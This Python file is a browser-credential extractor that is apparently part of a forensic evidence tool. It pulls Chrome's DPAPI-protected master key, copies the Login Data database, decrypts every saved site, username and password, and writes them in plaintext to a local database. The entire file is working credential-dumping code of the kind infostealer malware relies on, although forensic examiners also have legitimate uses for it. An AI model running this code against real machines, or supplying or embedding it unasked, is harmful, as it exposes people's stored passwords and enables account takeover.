import os
import sqlite3
import json
import base64
import shutil
import win32crypt
from Cryptodome.Cipher import AES
from ops import db_location

# Global constants
USER_PROFILE = os.environ['USERPROFILE']
CHROME_PATH_LOCAL_STATE = os.path.normpath(f"{USER_PROFILE}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
CHROME_PATH = os.path.normpath(f"{USER_PROFILE}\\AppData\\Local\\Google\\Chrome\\User Data")

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]  # Remove 'DPAPI' prefix
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(f"Error getting Chrome secret key: {e}")
        return None

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
        decrypted_pass = cipher.decrypt(encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return ""

def insert_credential(browser_name, url, username, password):
    connection = sqlite3.connect(db_location)  # Ensure this database path and name matches your setup
    cursor = connection.cursor()
    
    # Ensure your database schema matches these column names and you've created the credentials table beforehand
    cursor.execute("""
        INSERT INTO credentials (browser_name, url, username, password)
        VALUES (?, ?, ?, ?)
    """, (browser_name, url, username, password))

    connection.commit()
    connection.close()

class ChromeCredentials:
    def __init__(self):
        self._user_data = CHROME_PATH
        self.browser_name = "Chrome"

    def get_browser_credentials(self):
        secret_key = get_secret_key()
        if not secret_key:
            print("Secret key not found for Chrome.")
            return
        login_data_path = os.path.join(self._user_data, 'Default', 'Login Data')
        if not os.path.exists(login_data_path):
            print("Login Data not found for Chrome.")
            return
        login_data_copy = os.path.join(os.getenv("TEMP"), "Chrome_LoginData.db")
        shutil.copy2(login_data_path, login_data_copy)
        conn = sqlite3.connect(login_data_copy)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                if url and username and encrypted_password:
                    password = decrypt_password(encrypted_password, secret_key)
                    insert_credential(self.browser_name, url, username, password)
            print("Credentials decrypting and adding to evidence, please wait...")
        except Exception as e:
            print(f"Error processing Chrome credentials: {e}")
        finally:
            cursor.close()
            conn.close()
            os.remove(login_data_copy)

if __name__ == "__main__":
    cc = ChromeCredentials()
    cc.get_browser_credentials()
